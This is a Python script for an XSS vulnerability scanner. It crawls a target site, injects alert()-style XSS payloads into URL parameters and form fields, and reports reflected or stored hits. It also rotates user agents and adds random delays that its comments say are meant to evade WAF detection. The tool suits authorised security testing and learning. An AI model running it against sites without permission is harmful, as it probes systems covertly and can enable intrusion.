import requests
import time
import random
import re
import os
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

# A Lock prevents threads from printing over each other
print_lock = Lock()

# Class to store XSS detection logic
class XSSPayloadTester:
    # initalises the class
    def __init__(self, target_url, payloads):
        self.target_url = target_url # Stores the target url
        self.payloads = payloads # Stores the payloads
        self.session = requests.Session() # Creates a new user session
        self.results = [] # Stores found vulnerabilities

    # Jitters the program to prevent detection from a WAF
    def jitter(self):
        # Sleeps for a random time
        time.sleep(random.uniform(0.5, 2.0))

    # Method to get all of the inputs on a page
    def get_all_inputs(self):
        # Trys to get the inputs
        try:
            # gets the response of the target url
            res = self.session.get(self.target_url, headers=get_random_agent(), timeout=10)

            # Creates beautiful soup object to parse the html
            soup = BeautifulSoup(res.text, 'html.parser')
            
            # Empty list to store the inputs
            inputs = []
            
            # Extract parameters from the URL itself
            parsed_url = urlparse(self.target_url)
            # Extracts the url parmeters
            url_params = parse_qs(parsed_url.query)
            # Loops over the parameters
            for param in url_params:
                # Adds the parameter to the list
                inputs.append({"type": "url", "name": param, "method": "GET", "action": self.target_url})

            # Extract parameters from HTML Forms
            for form in soup.find_all("form"):
                action = form.get("action") # Gets the action from the form
                # Resolve relative URLs to absolute URLs
                post_url = urljoin(self.target_url, action)
                method = form.get("method", "get").lower() # Gets the methods from the form
                
                # Loops over the input tags
                for input_tag in form.find_all(["input", "textarea"]):
                    # Gets the name from the input tag
                    name = input_tag.get("name")
                    # Checks if there is a name
                    if name:
                        # Appends the gathered information to list
                        inputs.append({
                            "type": "form",
                            "name": name,
                            "method": method,
                            "action": post_url
                        })
            # Returns the inputs
            return inputs
        # Catches the errors
        except Exception as e:
            # Returns a empty list
            return []

    # Method to log the result
    def _log_result(self, xss_type, payload, status, param=None):
        # Builds the result object
        result = {"type": xss_type, "payload": payload, "status": status, "parameter": param}
        # Adds the result to results
        self.results.append(result)
        # Checks if status is vulnerable
        if status == "Vulnerable":
            # Uses the lock to prevent messy console output
            with print_lock:
                # Outputs the found vulnerability
                print(f"[!] {xss_type} XSS FOUND: {payload} in parameter: {param}")

    # Function to run the scanning logic for the page
    def run(self):
        # Gets all potential injection points
        target_inputs = self.get_all_inputs()
        
        # Loops through identified inputs
        for item in target_inputs:
            # Applies jitter to stay under the radar
            self.jitter()
            
            # Checks if the input is handled via GET
            if item['method'] == 'get':
                # Loops over XSS payloads
                for payload in self.payloads:
                    try:
                        # Sends the request with the payload
                        res = self.session.get(item['action'], params={item['name']: payload}, headers=get_random_agent(), timeout=5)
                        # Checks if the payload is reflected in the source code
                        if payload in res.text:
                            # Logs the vulnerability
                            self._log_result("Reflected", payload, "Vulnerable", item['name'])
                    except: continue
            
            # Checks if the input is handled via POST
            elif item['method'] == 'post':
                # Loops over XSS payloads
                for payload in self.payloads:
                    try:
                        # Posts the payload to the form action
                        self.session.post(item['action'], data={item['name']: payload}, headers=get_random_agent(), timeout=5)
                        # Re-visits the page to see if the payload was stored
                        check_res = self.session.get(self.target_url, headers=get_random_agent())
                        # Checks for reflection
                        if payload in check_res.text:
                            # Logs the stored vulnerability
                            self._log_result("Stored", payload, "Vulnerable", item['name'])
                    except: continue

        # Returns the list of findings
        return self.results

# Function to get random user agent from folder
def get_random_agent():
    # Fallback agents if file is missing
    user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"]
    # Path to the user agent file
    ua_path = "../../Resources/user_agent_strings.txt"
    
    if os.path.exists(ua_path):
        # Opens the file
        with open(ua_path, "r") as f:
            # Extracts the user agents as a list
            user_agents = [ua.strip() for ua in f if ua.strip()]

    # Returns the headers with a random agent
    return {"User-Agent": random.choice(user_agents)}

# Function to crawl a website and map all pages
def crawl_website(url, domain, visited=None):
    # Checks if visited is none
    if visited is None:
        # Creates a new set for visited
        visited = set()

    # Makes it stay within the same domain and avoid re-visiting pages
    if url in visited or domain not in urlparse(url).netloc:
        # Returns visited
        return visited

    # Outputs the url which is being visited
    with print_lock:
        print(f"[*] Crawling: {url}")
    
    # Adds the url to the set
    visited.add(url)

    try:
        # Gets a response from the page
        response = requests.get(url, headers=get_random_agent(), timeout=5)
        # Creates new beautiful soup object to parse the page
        soup = BeautifulSoup(response.text, 'html.parser')

        # Finds all 'a' tags with an 'href' attribute
        for link in soup.find_all('a', href=True):
            # Resolve relative URLs
            full_url = urljoin(url, link['href']).split('#')[0]
            # Recursive call to traverse the next page
            crawl_website(full_url, domain, visited)

    # Catches the error
    except: pass

    # Returns visited
    return visited

# Function to be executed by the threads
def scan_page(page, payloads):
    # Locks the print function to prevent jumbled text
    with print_lock:
        # Outputs the page being scanned
        print(f"--- Scanning Page: {page} ---")
    
    # Runs the XSS scanner
    scanner = XSSPayloadTester(page, payloads)
    # Returns the list of vulnerabilities found for this page
    return scanner.run()

# Main entry point of the script
def main():
    # Logs the starting time
    start_time = time.perf_counter() 

    # List of XSS payloads to test
    payloads = [
        "<script>alert('XSS')</script>",
        "\" onmouseover=\"alert(1)",
        "'> <script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>"
    ]

    # Allows the user to enter in a url to scan
    url = input("Enter Target URL: ").strip()
    # Extracts the domain name
    target_domain = urlparse(url).netloc
    
    # Outputs that crawling has started
    print("[*] Starting crawl to map the attack surface...")
    # Stores all of the pages found
    all_pages = crawl_website(url, target_domain)
    
    # Outputs discovery is complete
    print(f"[*] Discovery complete. Scanning {len(all_pages)} pages for XSS...")

    # Stores all vulnerabilities found across all threads
    vulnerability_log = []

    # Creates the thread pool executor
    with ThreadPoolExecutor(max_workers=7) as executor:
        # Maps the scan_page function to the all_pages list
        futures = [executor.submit(scan_page, page, payloads) for page in all_pages]
        
        # Collects results as threads finish
        for future in futures:
            # Gets the list of findings
            result = future.result()
            # Checks if findings exist
            if result:
                # Adds findings to the log
                vulnerability_log.extend(result)

    # Calculates the elapsed time
    elapsed = time.perf_counter() - start_time

    # Outputs completion time
    print(f"\n[✓] Finished in {elapsed:.2f} seconds")

    # Checks if any vulnerabilities were found
    if vulnerability_log:
        # Prompts to save
        choice = input(f"\n[!] Found {len(vulnerability_log)} vulnerabilities. Save results? (y/n): ").strip().lower()
        if choice == 'y':
            # Opens file to write
            with open("xss_scan_results.txt", "w") as f:
                for vuln in vulnerability_log:
                    # Writes vulnerability details to file
                    f.write(f"Type: {vuln['type']} | Parameter: {vuln['parameter']} | Payload: {vuln['payload']}\n")
            print("[+] Results saved to xss_scan_results.txt")
    else:
        # Outputs no vulnerabilities found
        print("[-] No XSS vulnerabilities detected.")

# Starts the program
if __name__ == "__main__":
    main()